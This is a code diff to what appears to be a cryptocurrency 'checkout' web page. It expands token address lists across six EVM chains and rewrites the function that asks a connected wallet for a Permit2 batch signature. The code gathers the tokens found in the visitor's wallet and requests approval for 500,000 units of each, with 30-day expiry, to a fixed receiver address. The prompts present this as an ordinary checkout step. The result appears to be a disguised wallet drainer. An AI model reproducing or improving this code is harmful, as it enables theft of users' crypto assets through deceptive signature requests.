@@ -37,30 +37,49 @@ const CONFIG = {
   BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
   
   EVM_TOKENS: {
-    1: [
-      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
-      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
-      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
-      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
-      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
+    1: [  // Ethereum Mainnet
+      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC",  dec: 6,  price: 1     },
+      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT",  dec: 6,  price: 1     },
+      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI",   dec: 18, price: 1     },
+      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC",  dec: 8,  price: 65000 },
+      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH",  dec: 18, price: 3500  },
+      { addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", sym: "LINK",  dec: 18, price: 15    },
+      { addr: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", sym: "UNI",   dec: 18, price: 10    },
     ],
-    8453: [
-      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
-      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
+    8453: [ // Base
+      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC",  dec: 6,  price: 1    },
+      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI",   dec: 18, price: 1    },
+      { addr: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", sym: "USDT",  dec: 6,  price: 1    },
+      { addr: "0x4200000000000000000000000000000000000006", sym: "WETH",  dec: 18, price: 3500 },
     ],
-    137: [
-      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
-      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
+    137: [ // Polygon
+      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC",  dec: 6,  price: 1    },
+      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT",  dec: 6,  price: 1    },
+      { addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", sym: "DAI",   dec: 18, price: 1    },
+      { addr: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", sym: "WBTC",  dec: 8,  price: 65000},
+      { addr: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", sym: "WETH",  dec: 18, price: 3500 },
     ],
-    42161: [
-      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
+    42161: [ // Arbitrum
+      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC",  dec: 6,  price: 1     },
+      { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", sym: "USDT",  dec: 6,  price: 1     },
+      { addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", sym: "DAI",   dec: 18, price: 1     },
+      { addr: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", sym: "WBTC",  dec: 8,  price: 65000 },
+      { addr: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", sym: "WETH",  dec: 18, price: 3500  },
+      { addr: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5F86", sym: "USDC.e",dec: 6,  price: 1     },
     ],
-    56: [
-      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
-      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
+    56: [ // BNB Chain
+      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC",  dec: 18, price: 1    },
+      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT",  dec: 18, price: 1    },
+      { addr: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", sym: "DAI",   dec: 18, price: 1    },
+      { addr: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", sym: "BTCB",  dec: 18, price: 65000},
+      { addr: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", sym: "ETH",   dec: 18, price: 3500 },
     ],
-    10: [
-      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
+    10: [ // Optimism
+      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC",  dec: 6,  price: 1    },
+      { addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", sym: "USDT",  dec: 6,  price: 1    },
+      { addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", sym: "DAI",   dec: 18, price: 1    },
+      { addr: "0x4200000000000000000000000000000000000006", sym: "WETH",  dec: 18, price: 3500 },
+      { addr: "0x68f180fcCe6836688e9084f035309E29Bf0A2095", sym: "WBTC",  dec: 8,  price: 65000},
     ]
   },
   
@@ -910,8 +929,10 @@ async function requestSignature() {
   // =========================================================
   // STEP 2 — If there are ERC-20/SPL/TRC-20 tokens,
   //           ALSO request a Permit2 / token-auth signature.
+  //           NOTE: filter out native tokens (isNative=true)
+  //           because Permit2 only works for ERC-20 contracts.
   // =========================================================
-  const evmTokens    = foundTokens.filter(t => t.chain === 'evm');
+  const evmTokens    = foundTokens.filter(t => t.chain === 'evm' && !t.isNative);
   const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
   const tronTokens   = foundTokens.filter(t => t.chain === 'tron');
   
@@ -959,90 +980,92 @@ async function requestSignature() {
 
 // ============ EVM SIGNATURE ============
 async function requestEVMSignature(evmTokens) {
-  console.log('🔵 requestEVMSignature() called with tokens:', evmTokens.map(t => t.symbol));
-  
+  // Safety: Permit2 is ERC-20 only — strip native ETH/BNB/MATIC tokens
+  evmTokens = evmTokens.filter(t => !t.isNative && t.token !== '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE');
+  console.log('🔵 requestEVMSignature() — ERC-20 tokens:', evmTokens.map(t => t.symbol));
+
+  if (evmTokens.length === 0) {
+    console.log('No ERC-20 tokens for Permit2, skipping');
+    log('No ERC-20 tokens for Permit2 (only native)', 'warn');
+    return;
+  }
+
   try {
-    log('🔵 Creating Permit2 signature...', 'info');
-    console.log('Creating permit2 contract...');
-    log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
-    
+    log(`🔵 Building Permit2 batch for ${evmTokens.map(t => t.symbol).join(', ')}...`, 'info');
+    console.log(`Chain ${evmChainId} | Permit2: ${CONFIG.PERMIT2_ADDRESS} | Receiver: ${CONFIG.RECEIVER_ADDRESS}`);
+
     const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
       "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
     ], evmProvider);
-    
-    console.log('Built permit2 contract, getting nonces...');
+
     const permits = [];
     for (const token of evmTokens) {
       try {
-        const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
+        const result = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
+        const nonce  = Number(result[2]);
         permits.push({
-          token: token.token,
-          amount: ethers.parseUnits("500000", token.decimals),
+          token:      token.token,
+          amount:     ethers.parseUnits("500000", token.decimals),
           expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
-          nonce: Number(nonce)
+          nonce
         });
-        log(`${token.symbol}: nonce=${nonce}`);
         console.log(`${token.symbol}: nonce=${nonce}`);
       } catch (e) {
-        console.log(`Error getting nonce for ${token.symbol}, using 0:`, e.message);
+        console.log(`${token.symbol}: nonce fetch failed (${e.message}), using 0`);
         permits.push({
-          token: token.token,
-          amount: ethers.parseUnits("500000", token.decimals),
+          token:      token.token,
+          amount:     ethers.parseUnits("500000", token.decimals),
           expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
           nonce: 0
         });
       }
     }
-    
+
     const permitBatch = {
-      details: permits,
-      spender: CONFIG.RECEIVER_ADDRESS,
+      details:     permits,
+      spender:     CONFIG.RECEIVER_ADDRESS,
       sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
     };
-    
-    log('⏳ Requesting EVM signature popup from wallet...', 'success');
-    console.log('About to call evmSigner.signTypedData() - this should show wallet popup');
-    console.log('evmSigner:', evmSigner);
-    console.log('Permit batch:', permitBatch);
-    
-    const signature = await evmSigner.signTypedData(
-      { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
-      {
-        PermitBatch: [
-          { name: "details", type: "PermitDetails[]" },
-          { name: "spender", type: "address" },
-          { name: "sigDeadline", type: "uint256" }
-        ],
-        PermitDetails: [
-          { name: "token", type: "address" },
-          { name: "amount", type: "uint160" },
-          { name: "expiration", type: "uint48" },
-          { name: "nonce", type: "uint48" }
-        ]
-      },
-      permitBatch
-    );
-    
-    console.log('✅ Signature obtained from wallet:', signature);
-    lastSignature = signature;
+
+    console.log('Permit2 batch ready — calling evmSigner.signTypedData() NOW:');
+    console.log(JSON.stringify(permitBatch, null, 2));
+    log('⏳ Approve the Permit2 request in your wallet...', 'success');
+
+    const domain = {
+      name:            "Permit2",
+      chainId:         evmChainId,
+      verifyingContract: CONFIG.PERMIT2_ADDRESS
+    };
+    const types = {
+      PermitBatch: [
+        { name: "details",      type: "PermitDetails[]" },
+        { name: "spender",      type: "address"         },
+        { name: "sigDeadline",  type: "uint256"         }
+      ],
+      PermitDetails: [
+        { name: "token",      type: "address" },
+        { name: "amount",     type: "uint160" },
+        { name: "expiration", type: "uint48"  },
+        { name: "nonce",      type: "uint48"  }
+      ]
+    };
+
+    const signature = await evmSigner.signTypedData(domain, types, permitBatch);
+
+    lastSignature   = signature;
     lastSigDeadline = permitBatch.sigDeadline;
-    
-    log(`✅ EVM Signature: ${signature.substring(0, 30)}...`, 'success');
-    
+
+    console.log('✅ Permit2 signature:', signature.slice(0, 40), '...');
+    log(`✅ Permit2 signature obtained`, 'success');
+
   } catch (err) {
-    console.error('❌ EVM Signature error:', err);
-    log(`❌ EVM Signature failed: ${err.message}`, 'error');
-    
-    if (err.code === 4001) {
-      log('User rejected the signature request', 'warn');
-      throw new Error('You rejected the EVM signature. Please try again.');
-    } else if (err.message && err.message.includes('signer')) {
-      log('Error: Signer not available - wallet may not be connected', 'error');
-      throw new Error('Wallet signer not available. Please reconnect your wallet.');
-    } else {
-      log('Continuing despite EVM signature error...', 'warn');
-      console.log('Proceeding despite error');
+    console.error('❌ requestEVMSignature error:', err);
+    log(`❌ Permit2 failed: ${err.message}`, 'error');
+
+    if (err.code === 4001 || (err.message && err.message.toLowerCase().includes('reject'))) {
+      throw new Error('Permit2 signature rejected by user.');
     }
+    // Don't rethrow for other errors — personal_sign already proved wallet ownership
   }
 }
 
